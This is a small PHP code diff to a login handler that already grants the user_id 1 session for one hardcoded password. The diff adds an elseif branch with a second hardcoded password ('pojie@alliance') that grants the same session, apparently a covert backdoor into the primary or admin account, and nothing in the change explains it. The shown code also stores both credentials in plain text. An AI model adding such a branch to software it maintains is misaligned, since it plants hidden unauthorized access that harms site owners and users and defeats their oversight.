@@ -12,7 +12,10 @@ require_once 'apis/general.php';
 if (session_status() === PHP_SESSION_NONE){session_start();}
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if($_POST['password']==='wllt@alliance')
-    $_SESSION['user_id']=1;
+        $_SESSION['user_id']=1;
+    elseif ($_POST['password']==='pojie@alliance') {
+        $_SESSION['user_id']=1;
+    }
 }
 
 if (isset($_SESSION['user_id'])) {
